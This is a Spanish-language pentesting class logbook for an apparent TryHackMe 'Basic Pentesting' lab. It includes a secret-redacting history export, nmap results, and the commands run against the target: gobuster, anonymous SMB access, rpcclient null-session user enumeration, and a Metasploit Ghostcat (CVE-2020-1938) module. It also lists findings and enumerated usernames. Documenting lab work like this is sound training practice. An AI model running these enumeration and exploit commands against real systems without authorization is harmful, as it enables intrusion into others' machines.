# Bitácora de comandos

Exportá los comandos relevantes de cada sesión de Kali al finalizar cada clase.

## Comando de export (con redacción automática de secretos)

```bash
history | sed -E 's/(password|passwd|token|secret|api[_ -]?key)[^ ]*/\1=[REDACTED]/Ig' \
  > bitacora/clase_XX_$(date +%Y%m%d).txt
```

## Antes de commitear (revisión manual obligatoria)

1. Abrir el archivo y buscar contraseñas, tokens, claves privadas, IPs personales.
2. Reemplazar todo por `[REDACTED]`.
3. Verificar que **no** se suba ningún archivo `.ovpn` ni credencial de THM/GitHub.

> La bitácora no reemplaza la revisión manual de secretos.

---

## Hallazgos de escaneo — Basic Pentesting (10.65.141.11)

### Puertos abiertos (nmap -p-)
| Puerto | Servicio | Versión |
|---|---|---|
| 22/tcp | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | http | Apache httpd 2.4.41 (Ubuntu) |
| 139/tcp | netbios-ssn | Samba smbd 4 |
| 445/tcp | microsoft-ds | Samba smbd 4.15.13 |
| 8009/tcp | ajp13 | Apache Jserv Protocol v1.3 |
| 8080/tcp | http | Apache Tomcat/9.0.7 |

### Comandos relevantes
```bash
nmap -sC -sV -Pn -oN bitacora/nmap_inicial.txt 10.65.141.11
nmap -p- --min-rate 5000 -Pn -oN bitacora/nmap_puertos.txt 10.65.141.11
gobuster dir -u http://10.65.141.11 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o bitacora/gobuster.txt
smbclient -L //10.65.141.11 -N
smbclient //10.65.141.11/Anonymous -N -c 'ls; get staff.txt'
rpcclient -U '' -N 10.65.141.11 -c "lookupnames jan"
msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS 10.65.141.11; run"
```

### Hallazgos
- **H-01** – Directorio `/development/` con listado de directorios abierto (Information Disclosure).
  Notas `dev.txt` y `j.txt` expuestas. Salvaguarda: desactivar `Indexes` en Apache.
- **H-02** – Share SMB `Anonymous` accesible sin autenticación, contiene `staff.txt` con
  información interna y nombres de usuarios (Information Disclosure / CWE-200).
- **H-03** – Apache Tomcat 9.0.7 con puerto AJP 8009 expuesto → vulnerable a Ghostcat
  (CVE-2020-1938); la lectura quedó limitada a la app por normalización de rutas.
- **H-04** – Tomcat 9.0.7 desactualizado + `/manager/html` con credenciales por defecto
  descartadas (76 combos de SecLists, sin éxito).
- **Usuarios confirmados (SAMR lookupnames):** `jan` (1001), `kay` (1000), `ubuntu` (1002).
